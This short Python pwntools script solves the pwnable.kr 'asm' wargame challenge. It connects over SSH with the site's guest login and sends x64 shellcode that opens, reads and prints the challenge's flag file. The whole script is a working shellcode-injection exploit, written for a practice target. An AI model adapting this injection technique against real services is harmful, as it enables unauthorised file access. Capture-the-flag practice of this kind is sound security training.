from pwn import *

context(arch='amd64',os='linux')

s = ssh(host='pwnable.kr',port=2222,user='asm',password='guest')

r = s.remote('localhost',9026)

r.recvuntil("give me your x64 shellcode: ")

flag_file = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

log.info("Sending shellcode")

sc = asm(shellcraft.open(flag_file))
sc += asm(shellcraft.read("rax", "rsp", 50))
sc += asm(shellcraft.write(1, "rsp", 50))
r.sendline(sc)
print r.recvline()

r.close()
s.close()

